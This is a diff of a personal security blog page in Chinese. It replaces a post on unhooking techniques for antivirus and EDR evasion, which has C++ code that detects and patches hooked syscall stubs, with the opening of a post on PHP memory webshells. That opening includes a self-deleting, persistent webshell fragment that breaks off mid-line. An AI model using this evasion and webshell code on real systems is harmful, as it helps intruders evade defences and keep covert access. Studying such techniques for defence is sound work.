@@ -13,7 +13,7 @@
   
   <title>
     
-      免杀中的unhook手法(持续更新) 
+      mem-webshell 
       
       
       |
@@ -153,11 +153,11 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">免杀中的unhook手法(持续更新)</div>
+      <div class="post-title">mem-webshell</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-04-15 21:01:38
+          2024-04-15 22:40:29
         </span>
         
               <span class="post-tags">
@@ -173,26 +173,8 @@
           
       </div>
       <div class="markdown-body">
-        <h1 id="UnhookingPatch"><a href="#UnhookingPatch" class="headerlink" title="UnhookingPatch"></a>UnhookingPatch</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/SaadAhla/UnhookingPatch">https://github.com/SaadAhla/UnhookingPatch</a></p>
-<p>通过syscall stub来判断是否被hook</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">isItHooked</span><span class="params">(LPVOID addr)</span> </span>&#123;</span><br><span class="line">    BYTE stub[] = <span class="string">&quot;\x4c\x8b\xd1\xb8&quot;</span>;          </span><br><span class="line">    <span class="comment">// syscall stub:</span></span><br><span class="line">    <span class="comment">// mov r10, rcx</span></span><br><span class="line">    <span class="comment">// mov eax</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(addr, stub, <span class="number">4</span>) != <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h1 id="mem-Webshell"><a href="#mem-Webshell" class="headerlink" title="mem-Webshell"></a>mem-Webshell</h1><h2 id="php内存马"><a href="#php内存马" class="headerlink" title="php内存马"></a>php内存马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// </span></span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// </span></span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&quot;2.php&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md($_GET[&quot;pass&quot;]))&#x27;</span></span><br></pre></td></tr></table></figure>
 
-
-
-<p>unhook的手法，修改内存页属性，将patch内容写入内存，恢复内存页</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookPatch</span><span class="params">(LPVOID addr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD oldprotect = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">    BYTE syscallNum = <span class="built_in">GetsyscallNum</span>(addr);</span><br><span class="line">    DWORD64 syscallInst = <span class="built_in">GetsyscallInstr</span>(addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// mov     r10, rcx        </span></span><br><span class="line">    <span class="comment">// mov     eax, SSN</span></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="comment">// retn</span></span><br><span class="line"></span><br><span class="line">    BYTE patch[] = &#123; <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xB8</span>, <span class="number">0xBC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0xC3</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    patch[<span class="number">4</span>] = syscallNum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall instruction</span></span><br><span class="line">    patch[<span class="number">8</span>] = *(BYTE*)syscallInst;</span><br><span class="line">    patch[<span class="number">9</span>] = *(BYTE*)(syscallInst + <span class="number">0x1</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将 addr 指向的内存页的保护属性设置为可执行、可读写，并将原始的保护属性值存储到 oldprotect 变量中，以便将来恢复原始的保护属性</span></span><br><span class="line">    BOOL status1 = <span class="built_in">VirtualProtect</span>(addr, <span class="number">4096</span>, PAGE_EXECUTE_READWRITE, &amp;oldprotect);</span><br><span class="line">    <span class="keyword">if</span> (!status1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed in changing protection (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, patch, <span class="built_in">sizeof</span>(patch));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 恢复</span></span><br><span class="line">    BOOL status2 = <span class="built_in">VirtualProtect</span>(addr, <span class="number">4096</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    <span class="keyword">if</span> (!status2) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed in changing protection back (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="LdrLoadDll-Unhooking"><a href="#LdrLoadDll-Unhooking" class="headerlink" title="LdrLoadDll-Unhooking"></a>LdrLoadDll-Unhooking</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/trickster0/LdrLoadDll-Unhooking">https://github.com/trickster0/LdrLoadDll-Unhooking</a></p>
-<p>上个项目的思路就是直接修改内存中数据然后patch掉</p>
-<p>这个项目的思路：实际上是做一个跳板函数绕过hook</p>
-<p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404152101165.png" alt="image-20240415210111729"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
-<li><a target="_blank" rel="noopener" href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></li>
-</ol>
 <!-- flag of hidden posts -->
       </div>
       
@@ -203,7 +185,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-04-15 21:01:38
+              2024-04-15 22:40:29
             </span>
             
                   <span class="post-tags">
@@ -232,7 +214,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UnhookingPatch"><span class="toc-text">UnhookingPatch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LdrLoadDll-Unhooking"><span class="toc-text">LdrLoadDll-Unhooking</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mem-Webshell"><span class="toc-text">mem-Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">php内存马</span></a></li></ol></li></ol>
       
     </div>
   </div>
@@ -520,12 +502,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%85%8D%E6%9D%80%E4%B8%AD%E7%9A%84unhook%E6%89%8B%E6%B3%95(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0) + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F04%2F15%2Funhook_AVBypass%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + mem-webshell + '&url=' + http%3A%2F%2Fexample.com%2F2024%2F04%2F15%2Fmem-webshell%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/04/15/unhook_AVBypass/" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2024/04/15/mem-webshell/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
